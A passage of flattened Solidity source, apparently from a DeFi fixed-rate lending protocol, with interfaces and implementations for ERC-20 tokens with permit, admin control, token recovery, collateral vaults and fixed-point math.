AdminStorage {\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n    function _renounceAdmin() external virtual;\n\n\n\n    function _transferAdmin(address newAdmin) external virtual;\n\n\n\n    /**\n\n     * EVENTS\n\n     */\n\n    event TransferAdmin(address indexed oldAdmin, address indexed newAdmin);\n\n}\n\nabstract contract BalanceSheetInterface is BalanceSheetStorage {\n\n    /**\n\n     * CONSTANT FUNCTIONS\n\n     */\n\n    function getClutchableCollateral(FyTokenInterface fyToken, uint256 repayAmount)\n\n        external\n\n        view\n\n        virtual\n\n        returns (uint256);\n\n\n\n    function getCurrentCollateralizationRatio(FyTokenInterface fyToken, address account)\n\n        public\n\n        view\n\n        virtual\n\n        returns (uint256);\n\n\n\n    function getHypotheticalCollateralizationRatio(\n\n        FyTokenInterface fyToken,\n\n        address account,\n\n        uint256 lockedCollateral,\n\n        uint256 debt\n\n    ) public view virtual returns (uint256);\n\n\n\n    function getVault(FyTokenInterface fyToken, address account)\n\n        external\n\n        view\n\n        virtual\n\n        returns (\n\n            uint256,\n\n            uint256,\n\n            uint256,\n\n            bool\n\n        );\n\n\n\n    function getVaultDebt(FyTokenInterface fyToken, address account) external view virtual returns (uint256);\n\n\n\n    function getVaultLockedCollateral(FyTokenInterface fyToken, address account)\n\n        external\n\n        view\n\n        virtual\n\n        returns (uint256);\n\n\n\n    function isAccountUnderwater(FyTokenInterface fyToken, address account) external view virtual returns (bool);\n\n\n\n    function isVaultOpen(FyTokenInterface fyToken, address account) external view virtual returns (bool);\n\n\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n\n\n    function clutchCollateral(\n\n        FyTokenInterface fyToken,\n\n        address liquidator,\n\n        address borrower,\n\n        uint256 clutchedCollateralAmount\n\n    ) external virtual returns (bool);\n\n\n\n    function depositCollateral(FyTokenInterface fyToken, uint256 collateralAmount) external virtual returns (bool);\n\n\n\n    function freeCollateral(FyTokenInterface fyToken, uint256 collateralAmount) external virtual returns (bool);\n\n\n\n    function lockCollateral(FyTokenInterface fyToken, uint256 collateralAmount) external virtual returns (bool);\n\n\n\n    function openVault(FyTokenInterface fyToken) external virtual returns (bool);\n\n\n\n    function setVaultDebt(\n\n        FyTokenInterface fyToken,\n\n        address account,\n\n        uint256 newVaultDebt\n\n    ) external virtual returns (bool);\n\n\n\n    function withdrawCollateral(FyTokenInterface fyToken, uint256 collateralAmount) external virtual returns (bool);\n\n\n\n    /**\n\n     * EVENTS\n\n     */\n\n\n\n    event ClutchCollateral(\n\n        FyTokenInterface indexed fyToken,\n\n        address indexed liquidator,\n\n        address indexed borrower,\n\n        uint256 clutchedCollateralAmount\n\n    );\n\n\n\n    event DepositCollateral(FyTokenInterface indexed fyToken, address indexed account, uint256 collateralAmount);\n\n\n\n    event FreeCollateral(FyTokenInterface indexed fyToken, address indexed account, uint256 collateralAmount);\n\n\n\n    event LockCollateral(FyTokenInterface indexed fyToken, address indexed account, uint256 collateralAmount);\n\n\n\n    event OpenVault(FyTokenInterface indexed fyToken, address indexed account);\n\n\n\n    event SetVaultDebt(FyTokenInterface indexed fyToken, address indexed account, uint256 oldDebt, uint256 newDebt);\n\n\n\n    event WithdrawCollateral(FyTokenInterface indexed fyToken, address indexed account, uint256 collateralAmount);\n\n}\n\nabstract contract Erc20Interface is Erc20Storage {\n\n    /**\n\n     * CONSTANT FUNCTIONS\n\n     */\n\n    function allowance(address owner, address spender) external view virtual returns (uint256);\n\n\n\n    function balanceOf(address account) external view virtual returns (uint256);\n\n\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n    function approve(address spender, uint256 amount) external virtual returns (bool);\n\n\n\n    function transfer(address recipient, uint256 amount) external virtual returns (bool);\n\n\n\n    function transferFrom(\n\n        address sender,\n\n        address recipient,\n\n        uint256 amount\n\n    ) external virtual returns (bool);\n\n\n\n    /**\n\n     * EVENTS\n\n     */\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n\n\n    event Burn(address indexed account, uint256 burnAmount);\n\n\n\n    event Mint(address indexed account, uint256 mintAmount);\n\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n}\n\nabstract contract Erc20PermitInterface is Erc20PermitStorage {\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n    function permit(\n\n        address owner,\n\n        address spender,\n\n        uint256 amount,\n\n        uint256 deadline,\n\n        uint8 v,\n\n        bytes32 r,\n\n        bytes32 s\n\n    ) external virtual;\n\n}\n\nabstract contract Erc20RecoverInterface is Erc20RecoverStorage {\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n    function _recover(Erc20Interface token, uint256 recoverAmount) external virtual;\n\n\n\n    function _setNonRecoverableTokens(Erc20Interface[] calldata tokens) external virtual;\n\n\n\n    /**\n\n     * EVENTS\n\n     */\n\n    event Recover(address indexed admin, Erc20Interface token, uint256 recoverAmount);\n\n    event SetNonRecoverableTokens(address indexed admin, Erc20Interface[] nonRecoverableTokens);\n\n}\n\nabstract contract Exponential is\n\n    CarefulMath, /* no dependency */\n\n    ExponentialStorage /* no dependency */\n\n{\n\n    /**\n\n     * @dev Adds two exponentials, returning a new exponential.\n\n     */\n\n    function addExp(Exp memory a, Exp memory b) internal pure returns (MathError, Exp memory) {\n\n        (MathError error, uint256 result) = addUInt(a.mantissa, b.mantissa);\n\n\n\n        return (error, Exp({ mantissa: result }));\n\n    }\n\n\n\n    /**\n\n     * @dev Divides two exponentials, returning a new exponential.\n\n     * (a/scale) / (b/scale) = (a/scale) * (scale/b) = a/b.\n\n     * NOTE: Returns an error if (`num` * 10e18) > MAX_INT, or if `denom` is zero.\n\n     */\n\n    function divExp(Exp memory a, Exp memory b) internal pure returns (MathError, Exp memory) {\n\n        (MathError err0, uint256 scaledNumerator) = mulUInt(a.mantissa, expScale);\n\n        if (err0 != MathError.NO_ERROR) {\n\n            return (err0, Exp({ mantissa: 0 }));\n\n        }\n\n\n\n        (MathError err1, uint256 rational) = divUInt(scaledNumerator, b.mantissa);\n\n        if (err1 != MathError.NO_ERROR) {\n\n            return (err1, Exp({ mantissa: 0 }));\n\n        }\n\n\n\n        return (MathError.NO_ERROR, Exp({ mantissa: rational }));\n\n    }\n\n\n\n    /**\n\n     * @dev Multiplies two exponentials, returning a new exponential.\n\n     */\n\n    function mulExp(Exp memory a, Exp memory b) internal pure returns (MathError, Exp memory) {\n\n        (MathError err0, uint256 doubleScaledProduct) = mulUInt(a.mantissa, b.mantissa);\n\n        if (err0 != MathError.NO_ERROR) {\n\n            return (err0, Exp({ mantissa: 0 }));\n\n        }\n\n\n\n        /*\n\n         * We add half the scale before dividing so that we get rounding instead of truncation.\n\n         * See "Listing 6" and text above it at https://accu.org/index.php/journals/1717\n\n         * Without this change, a result like 6.6...e-19 will be truncated to 0 instead of being rounded to 1e-18.\n\n         */\n\n        (MathError err1, uint256 doubleScaledProductWithHalfScale) = addUInt(halfExpScale, doubleScaledProduct);\n\n        if (err1 != MathError.NO_ERROR) {\n\n            return (err1, Exp({ mantissa: 0 }));\n\n        }\n\n\n\n        (MathError err2, uint256 product) = divUInt(doubleScaledProductWithHalfScale, expScale);\n\n        /* The only possible error `div` is MathError.DIVISION_BY_ZERO but we control `expScale` and it\'s not zero. */\n\n        assert(err2 == MathError.NO_ERROR);\n\n\n\n        return (MathError.NO_ERROR, Exp({ mantissa: product }));\n\n    }\n\n\n\n    /**\n\n     * @dev Multiplies three exponentials, returning a new exponential.\n\n     */\n\n    function mulExp3(\n\n        Exp memory a,\n\n        Exp memory b,\n\n        Exp memory c\n\n    ) internal pure returns (MathError, Exp memory) {\n\n        (MathError err, Exp memory ab) = mulExp(a, b);\n\n        if (err != MathError.NO_ERROR) {\n\n            return (err, ab);\n\n        }\n\n        return mulExp(ab, c);\n\n    }\n\n\n\n    /**\n\n     * @dev Subtracts two exponentials, returning a new exponential.\n\n     */\n\n    function subExp(Exp memory a, Exp memory b) internal pure returns (MathError, Exp memory) {\n\n        (MathError error, uint256 result) = subUInt(a.mantissa, b.mantissa);\n\n\n\n        return (error, Exp({ mantissa: result }));\n\n    }\n\n}\n\nabstract contract FintrollerStorage is Exponential {\n\n    struct Bond {\n\n        Exp collateralizationRatio;\n\n        uint256 debtCeiling;\n\n        bool isBorrowAllowed;\n\n        bool isDepositCollateralAllowed;\n\n        bool isLiquidateBorrowAllowed;\n\n        bool isListed;\n\n        bool isRedeemFyTokenAllowed;\n\n        bool isRepayBorrowAllowed;\n\n        bool isSupplyUnderlyingAllowed;\n\n    }\n\n\n\n    /**\n\n     * @dev Maps the fyToken address to the Bond structs.\n\n     */\n\n    mapping(FyTokenInterface => Bond) internal bonds;\n\n\n\n    /**\n\n     * @notice The contract that provides price data for the collateral and the underlying asset.\n\n     */\n\n    UniswapAnchoredViewInterface public oracle;\n\n\n\n    /**\n\n     * @notice Multiplier representing the discount on collateral that a liquidator receives.\n\n     */\n\n    uint256 public liquidationIncentiveMantissa;\n\n\n\n    /**\n\n     * @notice The ratio between mantissa precision (1e18) and the oracle price precision (1e6).\n\n     */\n\n    uint256 public constant oraclePricePrecisionScalar = 1.0e12;\n\n\n\n    /**\n\n     * @dev The threshold below which the collateralization ratio cannot be set, equivalent to 100%.\n\n     */\n\n    uint256 internal constant collateralizationRatioLowerBoundMantissa = 1.0e18;\n\n\n\n    /**\n\n     * @dev The threshold above which the collateralization ratio cannot be set, equivalent to 10,000%.\n\n     */\n\n    uint256 internal constant collateralizationRatioUpperBoundMantissa = 1.0e20;\n\n\n\n    /**\n\n     * @dev The dafault collateralization ratio set when a new bond is listed, equivalent to 150%.\n\n     */\n\n    uint256 internal constant defaultCollateralizationRatioMantissa = 1.5e18;\n\n\n\n    /**\n\n     * @dev The threshold below which the liquidation incentive cannot be set, equivalent to 100%.\n\n     */\n\n    uint256 internal constant liquidationIncentiveLowerBoundMantissa = 1.0e18;\n\n\n\n    /**\n\n     * @dev The threshold above which the liquidation incentive cannot be set, equivalent to 150%.\n\n     */\n\n    uint256 internal constant liquidationIncentiveUpperBoundMantissa = 1.5e18;\n\n\n\n    /**\n\n     * @notice Indicator that this is a Fintroller contract, for inspection.\n\n     */\n\n    bool public constant isFintroller = true;\n\n}\n\nabstract contract FyTokenInterface is FyTokenStorage {\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n    function borrow(uint256 borrowAmount) external virtual returns (bool);\n\n\n\n    function burn(address holder, uint256 burnAmount) external virtual returns (bool);\n\n\n\n    function liquidateBorrow(address borrower, uint256 repayAmount) external virtual returns (bool);\n\n\n\n    function mint(address beneficiary, uint256 borrowAmount) external virtual returns (bool);\n\n\n\n    function repayBorrow(uint256 repayAmount) external virtual returns (bool);\n\n\n\n    function repayBorrowBehalf(address borrower, uint256 repayAmount) external virtual returns (bool);\n\n\n\n    function _setFintroller(FintrollerInterface newFintroller) external virtual returns (bool);\n\n\n\n    /**\n\n     * EVENTS\n\n     */\n\n    event Borrow(address indexed account, uint256 repayAmount);\n\n\n\n    event LiquidateBorrow(\n\n        address indexed liquidator,\n\n        address indexed borrower,\n\n        uint256 repayAmount,\n\n        uint256 clutchedCollateralAmount\n\n    );\n\n\n\n    event RepayBorrow(address indexed payer, address indexed borrower, uint256 repayAmount, uint256 newDebt);\n\n\n\n    event SetFintroller(address indexed admin, FintrollerInterface oldFintroller, FintrollerInterface newFintroller);\n\n}\n\nabstract contract RedemptionPoolInterface is RedemptionPoolStorage {\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n    function redeemFyTokens(uint256 underlyingAmount) external virtual returns (bool);\n\n\n\n    function supplyUnderlying(uint256 underlyingAmount) external virtual returns (bool);\n\n\n\n    /**\n\n     * EVENTS\n\n     */\n\n    event RedeemFyTokens(address indexed account, uint256 fyTokenAmount, uint256 underlyingAmount);\n\n\n\n    event SupplyUnderlying(address indexed account, uint256 underlyingAmount, uint256 fyTokenAmount);\n\n}\n\nabstract contract Admin is AdminInterface {\n\n    /**\n\n     * @notice Throws if called by any account other than the admin.\n\n     */\n\n    modifier onlyAdmin() {\n\n        require(admin == msg.sender, "ERR_NOT_ADMIN");\n\n        _;\n\n    }\n\n\n\n    /**\n\n     * @notice Initializes the contract setting the deployer as the initial admin.\n\n     */\n\n    constructor() {\n\n        address msgSender = msg.sender;\n\n        admin = msgSender;\n\n        emit TransferAdmin(address(0x00), msgSender);\n\n    }\n\n\n\n    /**\n\n     * @notice Leaves the contract without admin, so it will not be possible to call\n\n     * `onlyAdmin` functions anymore.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The caller must be the administrator.\n\n     *\n\n     * WARNING: Doing this will leave the contract without an admin,\n\n     * thereby removing any functionality that is only available to the admin.\n\n     */\n\n    function _renounceAdmin() external virtual override onlyAdmin {\n\n        emit TransferAdmin(admin, address(0x00));\n\n        admin = address(0x00);\n\n    }\n\n\n\n    /**\n\n     * @notice Transfers the admin of the contract to a new account (`newAdmin`).\n\n     * Can only be called by the current admin.\n\n     * @param newAdmin The acount of the new admin.\n\n     */\n\n    function _transferAdmin(address newAdmin) external virtual override onlyAdmin {\n\n        require(newAdmin != address(0x00), "ERR_SET_ADMIN_ZERO_ADDRESS");\n\n        emit TransferAdmin(admin, newAdmin);\n\n        admin = newAdmin;\n\n    }\n\n}\n\ncontract Erc20 is\n\n    CarefulMath, /* no dependency */\n\n    Erc20Interface /* one dependency */\n\n{\n\n    /**\n\n     * @notice All three of these values are immutable: they can only be set once during construction.\n\n     * @param name_ Erc20 name of this token.\n\n     * @param symbol_ Erc20 symbol of this token.\n\n     * @param decimals_ Erc20 decimal precision of this token.\n\n     */\n\n    constructor(\n\n        string memory name_,\n\n        string memory symbol_,\n\n        uint8 decimals_\n\n    ) {\n\n        name = name_;\n\n        symbol = symbol_;\n\n        decimals = decimals_;\n\n    }\n\n\n\n    /**\n\n     * CONSTANT FUNCTIONS\n\n     */\n\n\n\n    /**\n\n     * @notice Returns the remaining number of tokens that `spender` will be\n\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n\n     * zero by default.\n\n     *\n\n     * This value changes when {approve} or {transferFrom} are called.\n\n     */\n\n    function allowance(address owner, address spender) external view virtual override returns (uint256) {\n\n        return allowances[owner][spender];\n\n    }\n\n\n\n    /**\n\n     * @notice Returns the amount of tokens owned by `account`.\n\n     */\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n\n        return balances[account];\n\n    }\n\n\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n\n\n    /**\n\n     * @notice Sets `amount` as the allowance of `spender` over the caller\'s tokens.\n\n     *\n\n     * @dev IMPORTANT: Beware that changing an allowance with this method brings the risk\n\n     * that someone may use both the old and the new allowance by unfortunate\n\n     * transaction ordering. One possible solution to mitigate this race\n\n     * condition is to first reduce the spender\'s allowance to 0 and set the\n\n     * desired value afterwards:\n\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n\n     *\n\n     * Emits an {Approval} event.\n\n     *\n\n     * @return a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\n\n        approveInternal(msg.sender, spender, amount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @notice Atomically decreases the allowance granted to `spender` by the caller.\n\n     *\n\n     * @dev This is an alternative to {approve} that can be used as a mitigation for\n\n     * problems described in {Erc20Interface-approve}.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     * - `spender` must have allowance for the caller of at least\n\n     * `subtractedValue`.\n\n     */\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\n\n        MathError mathErr;\n\n        uint256 newAllowance;\n\n        (mathErr, newAllowance) = subUInt(allowances[msg.sender][spender], subtractedValue);\n\n        require(mathErr == MathError.NO_ERROR, "ERR_ERC20_DECREASE_ALLOWANCE_UNDERFLOW");\n\n        approveInternal(msg.sender, spender, newAllowance);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @notice Atomically increases the allowance granted to `spender` by the caller.\n\n     *\n\n     * @dev This is an alternative to {approve} that can be used as a mitigation for\n\n     * problems described above.\n\n     *\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\n\n        MathError mathErr;\n\n        uint256 newAllowance;\n\n        (mathErr, newAllowance) = addUInt(allowances[msg.sender][spender], addedValue);\n\n        require(mathErr == MathError.NO_ERROR, "ERR_ERC20_INCREASE_ALLOWANCE_OVERFLOW");\n\n        approveInternal(msg.sender, spender, newAllowance);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @notice Moves `amount` tokens from the caller\'s account to `recipient`.\n\n     *\n\n     * @dev Emits a {Transfer} event.\n\n     *\n\n     * @return a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `recipient` cannot be the zero address.\n\n     * - The caller must have a balance of at least `amount`.\n\n     */\n\n    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {\n\n        transferInternal(msg.sender, recipient, amount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @notice See Moves `amount` tokens from `sender` to `recipient` using the\n\n     * allowance mechanism. `amount` is then deducted from the caller\'s\n\n     * allowance.\n\n     *\n\n     * @dev Emits a {Transfer} event. Emits an {Approval} event indicating the\n\n     * updated allowance. This is not required by the Erc. See the note at the\n\n     * beginning of {Erc20};\n\n     *\n\n     * @return a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `sender` and `recipient` cannot be the zero address.\n\n     * - `sender` must have a balance of at least `amount`.\n\n     * - The caller must have allowance for ``sender``\'s tokens of at least\n\n     * `amount`.\n\n     */\n\n    function transferFrom(\n\n        address sender,\n\n        address recipient,\n\n        uint256 amount\n\n    ) external virtual override returns (bool) {\n\n        transferInternal(sender, recipient, amount);\n\n        MathError mathErr;\n\n        uint256 newAllowance;\n\n        (mathErr, newAllowance) = subUInt(allowances[sender][msg.sender], amount);\n\n        require(mathErr == MathError.NO_ERROR, "ERR_ERC20_TRANSFER_FROM_INSUFFICIENT_ALLOWANCE");\n\n        approveInternal(sender, msg.sender, newAllowance);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * INTERNAL FUNCTIONS\n\n     */\n\n\n\n    /**\n\n     * @notice Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n\n     *\n\n     * @dev This is internal function is equivalent to `approve`, and can be used to\n\n     * e.g. set automatic allowances for certain subsystems, etc.\n\n     *\n\n     * Emits an {Approval} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `owner` cannot be the zero address.\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function approveInternal(\n\n        address owner,\n\n        address spender,\n\n        uint256 amount\n\n    ) internal virtual {\n\n        require(owner != address(0x00), "ERR_ERC20_APPROVE_FROM_ZERO_ADDRESS");\n\n        require(spender != address(0x00), "ERR_ERC20_APPROVE_TO_ZERO_ADDRESS");\n\n\n\n        allowances[owner][spender] = amount;\n\n        emit Approval(owner, spender, amount);\n\n    }\n\n\n\n    /**\n\n     * @notice Destroys `burnAmount` tokens from `holder`, recuding the token supply.\n\n     *\n\n     * @dev Emits a {Burn} event.\n\n     *\n\n     * Emits a {Transfer} event with `to` set to the zero address.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `holder` must have at least `amount` tokens.\n\n     */\n\n    function burnInternal(address holder, uint256 burnAmount) internal {\n\n        MathError mathErr;\n\n        uint256 newHolderBalance;\n\n        uint256 newTotalSupply;\n\n\n\n        /* Burn the yTokens. */\n\n        (mathErr, newHolderBalance) = subUInt(balances[holder], burnAmount);\n\n        require(mathErr == MathError.NO_ERROR, "ERR_ERC20_BURN_BALANCE_UNDERFLOW");\n\n        balances[holder] = newHolderBalance;\n\n\n\n        /* Reduce the total supply. */\n\n        (mathErr, newTotalSupply) = subUInt(totalSupply, burnAmount);\n\n        require(mathErr == MathError.NO_ERROR, "ERR_ERC20_BURN_TOTAL_SUPPLY_UNDERFLOW");\n\n        totalSupply = newTotalSupply;\n\n\n\n        emit Burn(holder, burnAmount);\n\n    }\n\n\n\n    /** @notice Prints new tokens into existence and assigns them to `beneficiary`,\n\n     * increasing the total supply.\n\n     *\n\n     * @dev Emits a {Transfer} event with `from` set to the zero address.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The beneficiary\'s balance and the total supply cannot overflow.\n\n     */\n\n    function mintInternal(address beneficiary, uint256 mintAmount) internal {\n\n        MathError mathErr;\n\n        uint256 newBeneficiaryBalance;\n\n        uint256 newTotalSupply;\n\n\n\n        /* Mint the yTokens. */\n\n        (mathErr, newBeneficiaryBalance) = addUInt(balances[beneficiary], mintAmount);\n\n        require(mathErr == MathError.NO_ERROR, "ERR_ERC20_MINT_BALANCE_OVERFLOW");\n\n        balances[beneficiary] = newBeneficiaryBalance;\n\n\n\n        /* Increase the total supply. */\n\n        (mathErr, newTotalSupply) = addUInt(totalSupply, mintAmount);\n\n        require(mathErr == MathError.NO_ERROR, "ERR_ERC20_MINT_TOTAL_SUPPLY_OVERFLOW");\n\n        totalSupply = newTotalSupply;\n\n\n\n        emit Mint(beneficiary, mintAmount);\n\n    }\n\n\n\n    /**\n\n     * @notice Moves `amount` tokens from `sender` to `recipient`.\n\n     *\n\n     * @dev This is internal function is equivalent to {transfer}, and can be used to\n\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `sender` cannot be the zero address.\n\n     * - `recipient` cannot be the zero address.\n\n     * - `sender` must have a balance of at least `amount`.\n\n     */\n\n    function transferInternal(\n\n        address sender,\n\n        address recipient,\n\n        uint256 amount\n\n    ) internal virtual {\n\n        require(sender != address(0x00), "ERR_ERC20_TRANSFER_FROM_ZERO_ADDRESS");\n\n        require(recipient != address(0x00), "ERR_ERC20_TRANSFER_TO_ZERO_ADDRESS");\n\n\n\n        MathError mathErr;\n\n        uint256 newSenderBalance;\n\n        uint256 newRecipientBalance;\n\n\n\n        (mathErr, newSenderBalance) = subUInt(balances[sender], amount);\n\n        require(mathErr == MathError.NO_ERROR, "ERR_ERC20_TRANSFER_SENDER_BALANCE_UNDERFLOW");\n\n        balances[sender] = newSenderBalance;\n\n\n\n        (mathErr, newRecipientBalance) = addUInt(balances[recipient], amount);\n\n        assert(mathErr == MathError.NO_ERROR);\n\n        balances[recipient] = newRecipientBalance;\n\n\n\n        emit Transfer(sender, recipient, amount);\n\n    }\n\n}\n\ncontract Erc20Permit is\n\n    Erc20PermitInterface, /* one dependency */\n\n    Erc20 /* three dependencies */\n\n{\n\n    constructor(\n\n        string memory name_,\n\n        string memory symbol_,\n\n        uint8 decimals_\n\n    ) Erc20(name_, symbol_, decimals_) {\n\n        uint256 chainId;\n\n        /* solhint-disable-next-line no-inline-assembly */\n\n        assembly {\n\n            chainId := chainid()\n\n        }\n\n        DOMAIN_SEPARATOR = keccak256(\n\n            abi.encode(\n\n                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),\n\n                keccak256(bytes(name)),\n\n                keccak256(bytes(version)),\n\n                chainId,\n\n                address(this)\n\n            )\n\n        );\n\n    }\n\n\n\n    /**\n\n     * @dev Sets `amount` as the allowance of `spender` over `owner`\'s tokens,\n\n     * assuming the latter\'s signed approval.\n\n     *\n\n     * IMPORTANT: The same issues Erc20 `approve` has related to transaction\n\n     * ordering also apply here.\n\n     *\n\n     * Emits an {Approval} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `owner` cannot be the zero address.\n\n     * - `spender` cannot be the zero address.\n\n     * - `deadline` must be a timestamp in the future.\n\n     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`\n\n     * over the Eip712-formatted function arguments.\n\n     * - The signature must use `owner`\'s current nonce.\n\n     */\n\n    function permit(\n\n        address owner,\n\n        address spender,\n\n        uint256 amount,\n\n        uint256 deadline,\n\n        uint8 v,\n\n        bytes32 r,\n\n        bytes32 s\n\n    ) external override {\n\n        require(owner != address(0x00), "ERR_ERC20_PERMIT_OWNER_ZERO_ADDRESS");\n\n        require(spender != address(0x00), "ERR_ERC20_PERMIT_SPENDER_ZERO_ADDRESS");\n\n        require(deadline >= block.timestamp, "ERR_ERC20_PERMIT_EXPIRED");\n\n\n\n        /* It\'s safe to use the "+" operator here because the nonce cannot realistically overflow, ever. */\n\n        bytes32 hashStruct = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, amount, nonces[owner]++, deadline));\n\n        bytes32 digest = keccak256(abi.encodePacked("\\x19\\x01", DOMAIN_SEPARATOR, hashStruct));\n\n        address recoveredOwner = ecrecover(digest, v, r, s);\n\n\n\n        require(recoveredOwner != address(0x00), "ERR_ERC20_PERMIT_RECOVERED_OWNER_ZERO_ADDRESS");\n\n        require(recoveredOwner == owner, "ERR_ERC20_PERMIT_INVALID_SIGNATURE");\n\n\n\n        approveInternal(owner, spender, amount);\n\n    }\n\n}\n\nabstract contract Erc20Recover is\n\n    Erc20RecoverInterface, /* one dependency */\n\n    Admin /* two dependencies */\n\n{\n\n    using SafeErc20 for Erc20Interface;\n\n\n\n    /**\n\n     * @notice Sets the tokens that this contract cannot recover.\n\n     *\n\n     * @dev Emits a {SetNonRecoverableTokens} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The caller must be the administrator.\n\n     * - The contract must be non-initialized.\n\n     * - The array of given tokens cannot be empty.\n\n     *\n\n     * @param tokens The array of tokens to set as non-recoverable.\n\n     */\n\n    function _setNonRecoverableTokens(Erc20Interface[] calldata tokens) external override onlyAdmin {\n\n        /* Checks */\n\n        require(isInitialized == false, "ERR_INITALIZED");\n\n\n\n        /* Iterate over the token list, sanity check each and update the mapping. */\n\n        uint256 length = tokens.length;\n\n        for (uint256 i = 0; i < length; i += 1) {\n\n            tokens[i].symbol();\n\n            nonRecoverableTokens.push(tokens[i]);\n\n        }\n\n\n\n        /* Effects: prevent this function from ever being called again. */\n\n        isInitialized = true;\n\n\n\n        emit SetNonRecoverableTokens(admin, tokens);\n\n    }\n\n\n\n    /**\n\n     * @notice Recover Erc20 tokens sent to this contract (by accident or otherwise).\n\n     * @dev Emits a {RecoverToken} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The caller must be the administrator.\n\n     * - The contract must be initialized.\n\n     * - The amount to recover cannot be zero.\n\n     * - The token to recover cannot be among the non-recoverable tokens.\n\n     *\n\n     * @param token The token to make the recover for.\n\n     * @param recoverAmount The uint256 amount to recover, specified in the token\'s decimal system.\n\n     */\n\n    function _recover(Erc20Interface token, uint256 recoverAmount) external override onlyAdmin {\n\n        /* Checks */\n\n        require(isInitialized == true, "ERR_NOT_INITALIZED");\n\n        require(recoverAmount > 0, "ERR_RECOVER_ZERO");\n\n\n\n        bytes32 tokenSymbolHash = keccak256(bytes(token.symbol()));\n\n        uint256 length = nonRecoverableTokens.length;\n\n\n\n        /**\n\n         * We iterate over the non-recoverable token array and check that:\n\n         *\n\n         *   1. The addresses of the tokens are not the same\n\n         *   2. The symbols of the tokens are not the same\n\n         *\n\n         * It is true that the second check may lead to a false positive, but\n\n         * there is no better way to fend off against proxied tokens.\n\n         */\n\n        for (uint256 i = 0; i < length; i += 1) {\n\n            require(\n\n                address(token) != address(nonRecoverableTokens[i]) &&\n\n                    tokenSymbolHash != keccak256(bytes(nonRecoverableTokens[i].symbol())),\n\n                "ERR_RECOVER_NON_RECOVERABLE_TOKEN"\n\n            );\n\n        }\n\n\n\n        /* Interactions */\n\n        token.safeTransfer(admin, recoverAmount);\n\n\n\n        emit Recover(admin, token, recoverAmount);\n\n    }\n\n}\n\nabstract contract FintrollerInterface is FintrollerStorage {\n\n    /**\n\n     * CONSTANT FUNCTIONS\n\n     */\n\n\n\n    function getBond(FyTokenInterface fyToken)\n\n        external\n\n        view\n\n        virtual\n\n        returns (\n\n            uint256 debtCeiling,\n\n            uint256 collateralizationRatioMantissa,\n\n            bool isBorrowAllowed,\n\n            bool isDepositCollateralAllowed,\n\n            bool isLiquidateBorrowAllowed,\n\n            bool isListed,\n\n            bool isRedeemFyTokenAllowed,\n\n            bool isRepayBorrowAllowed,\n\n            bool isSupplyUnderlyingAllowed\n\n        );\n\n\n\n    function getBorrowAllowed(FyTokenInterface fyToken) external view virtual returns (bool);\n\n\n\n    function getBondDebtCeiling(FyTokenInterface fyToken) external view virtual returns (uint256);\n\n\n\n    function getBondCollateralizationRatio(FyTokenInterface fyToken) external view virtual returns (uint256);\n\n\n\n    function getDepositCollateralAllowed(FyTokenInterface fyToken) external view virtual returns (bool);\n\n\n\n    function getLiquidateBorrowAllowed(FyTokenInterface fyToken) external view virtual returns (bool);\n\n\n\n    function getRedeemFyTokensAllowed(FyTokenInterface fyToken) external view virtual returns (bool);\n\n\n\n    function getRepayBorrowAllowed(FyTokenInterface fyToken) external view virtual returns (bool);\n\n\n\n    function getSupplyUnderlyingAllowed(FyTokenInterface fyToken) external view virtual returns (bool);\n\n\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n\n\n    function listBond(FyTokenInterface fyToken) external virtual returns (bool);\n\n\n\n    function setBorrowAllowed(FyTokenInterface fyToken, bool state) external virtual returns (bool);\n\n\n\n    function setCollateralizationRatio(FyTokenInterface fyToken, uint256 newCollateralizationRatioMantissa)\n\n        